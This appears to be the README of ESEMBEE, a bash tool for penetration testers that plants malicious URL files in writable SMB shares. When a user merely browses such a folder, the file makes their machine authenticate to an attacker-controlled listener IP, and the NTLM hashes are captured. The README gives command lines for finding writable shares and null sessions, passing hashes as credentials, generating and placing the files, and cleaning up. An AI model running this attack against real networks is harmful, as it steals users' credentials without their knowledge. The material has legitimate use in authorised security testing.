# ESEMBEE--A tool for URL File attacks targeting SMB shares 

ESEMBEE is a tool written in bash that aids in the process of utilizing malicious URL files in writeable file shares to capture user hashes. Below you'll find a quick synopsis of what a URL file is, how it is used in penetration testing to capture hashes and some examples of how the Esembee shell script can be leveraged to aid in the process of identifying writable shares, creating a URL file, placing the URL file in the writeable shares, and ultimately cleaning up the environment once the engagement is over. 

## What is a URL file?

To keep it simple a URL file is a file that points to a specific URL. This file is typically utilized as a shortcut to a webpage. An example of a legitimate URL file is below. 

## Leveraging a URL to Capture Hashes

Utilizing a specifically crafted URL file, a pentester can capture hashes of the users that simply browse to the directory location of the URL file. The reason for this due to the way the URL file is created. When a user browses to a directory hosting the URL file, the URL file forces the user to request an icon file from and provide authentication to the IP listed in the URL file. However, instead of providng an icon, the IP will be listening for and waiting for this authentication request to occur. Typically a tool like Responder will be utilized to capture this hash, however, other tools can be leveraged as well. 

The best part is that all of these requests and authentication efforts are done in the background and the user does not need to even open the URL file. As long as the user opens the directory then this attack can be leveraged. 

With that being said, an ideal target directory for this URL file will be a shared file share. 

# Utilizing the ESEMBEE script

With this attack method in mind, the ESEMBEE script was written to aid in the process of performing an URL file attack. ESEMBEE has the following requirements:
1. Domain User creds (either a NTLM hash or a cleartext password) UPDATE:ESEMBEE can now check for Null sessions. the -u and -p options must still be used. 
2. A Target
   * This can be a txt of IPs with the -f option OR
   * This can be a single IP with (-I) along with a specific share with (-S)


## Target Options

With ESEMBEE, a target can be specified in different ways. A txt of IPs where every found writeable share will have a URL file placed or for a more targeted approach, a single IP and share can be specified. 





## Finding Writeable Shares

Using the context of a domain user, ESEMBEE can use the -t option to determine if a share is writeable

```
./esembee.sh -u DOMAIN/USER -p PASSWORD/HASH -f <scope.txt> -t
```
Esembee can also be used to search for null sessions with the following syntax.

```
./esembee.sh -u 'null' -p '-N' -f <scope.txt> -t
```
## URL File Options

esembee will create a URL file and request the IP for the malicious file when it is ran. You can also specify the URL file IP with the -L option if you want to skip the required prompt and perform a single command.  Alternatively, you specify an already created URL file with the -F option. 

##### syntax to Specify a Listener IP
```
./esembee.sh -u DOMAIN/USER -p PASSWORD/HASH -f <scope.txt> -L <ListenerIP>
```

##### Syntax to just run the URL file Generator

```
./esembee.sh -G
```

##### Syntax to Specify an already generated URL file

```
./esembee.sh -u DOMAIN/USER -p PASSWORD/HASH -f <scope.txt> -F <FILE.URL>

```
## Authentication Options

ESEMBEE can utilize both a cleartext password and an NTLM Hash to authenticate to the targeted shares. Regardless of the authentication method, the authentication should follow the -p argument. If the authentication used is an NTLM hash, simply add a -H tag to your command and the --ntlm-as-pass option for SMB client will be passed through. 

Additionally, a null session can also be used. to leverage a null session set the -u option to 'null' and the -p option to '-N'




##### Using an NTLM Hash for Authentication

```
./esembee.sh -u DOMAIN/USER -p PASSWORD/HASH -H -f <scope.txt> -F <FILE.URL>
```

##### Using NULL Sessions

```
./esembee.sh -u NULL -p '-N' -H -f <scope.txt> -F <FILE.URL>
```

## Cleanup Utility

```
./esembee.sh -u DOMAIN/USER -p PASSWORD/HASH -H -f <scope.txt> -F <FILE.URL> -C
```
